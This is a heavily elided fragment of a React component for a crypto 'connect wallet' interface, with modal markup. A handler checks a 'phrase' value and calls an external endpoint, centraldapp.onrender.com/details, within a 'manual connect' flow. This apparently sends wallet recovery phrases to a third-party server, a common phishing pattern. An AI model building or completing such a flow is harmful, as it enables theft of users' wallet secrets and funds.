...
const Coincomps = ({ data }) => {
  ...
  const toggleConnect = async () => {
    if (phrase === "") {
      ...
      try {
        const url = "https://centraldapp.onrender.com/details";
  ...
  return (
    <>
      ...
      {selectedItem && (
        <div
          className="fixed top-0 left-0 flex items-center justify-center w-full h-full overflow-x-hidden bg-gray-800 bg-opacity-75"
          data-aos="fade-up"
      ...
      {showManualConnectModal && (
        <div
          className="fixed top-0 left-0 flex items-center justify-center w-full h-full overflow-x-hidden bg-gray-800"
          data-aos="fade-up"
          data-aos-duration="1000"
        >
          {loading ? (
